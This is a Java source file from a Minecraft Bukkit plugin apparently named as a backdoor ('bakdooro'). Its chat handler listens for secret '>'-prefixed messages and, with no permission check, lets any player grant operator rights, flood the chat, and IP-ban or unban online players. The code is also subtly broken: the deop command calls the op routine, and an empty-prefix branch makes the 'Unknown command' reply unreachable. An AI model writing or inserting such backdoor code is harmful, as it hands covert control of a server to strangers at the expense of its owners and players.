package me.acaiberii.bakdooro.util.handler;

import me.acaiberii.bakdooro.game.server;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import java.io.IOException;
import java.util.Objects;

import static me.acaiberii.bakdooro.game.server.srv;
import static org.bukkit.Bukkit.getPlayer;

public class chathandler {
    public static void handler(Player pl, String message) {
        String[] spl = message.split(":");
        if (message.startsWith(">")) {
            if (spl[0].startsWith(">fillchat")) {
                me.acaiberii.bakdooro.exp.exploits.chatFill();
            }
            else if (spl[0].startsWith(">op")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >op:(PLAYER)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                }
            }
            else if (spl[0].startsWith(">deop")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >deop:(PLAYER)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteOp(Objects.requireNonNull(srv.getPlayer(spl[1])));
                }
            }
            else if (spl[0].startsWith(">ban")) {
                if (spl.length < 3) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >ban:(MODE):(PLAYER/auto)");
                }
                else {
                    if (spl[1].equals("auto")) {
                        for (Player pll : srv.getOnlinePlayers()) {
                            srv.banIP(Objects.requireNonNull(pll.getAddress()).getHostName());
                        }
                    }
                    else if (spl[1].equals("manual")) {
                        for (Player pll : srv.getOnlinePlayers()) {
                            if (pll.getName().equals(spl[2])) {
                                srv.banIP(Objects.requireNonNull(pll.getAddress()).getHostName());
                            }
                        }
                    }
                }
            }
            else if (spl[0].startsWith(">unban")) {
                if (spl.length < 2) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >unban:(PLAYER)");
                }
                else {
                    srv.unbanIP(Objects.requireNonNull(Objects.requireNonNull(getPlayer(spl[1])).getAddress()).getHostString());
                }
            }
            else if (spl[0].startsWith("")) {

            }
            else {
                pl.sendMessage("Unknown command. Try again.");
            }
        }
    }
}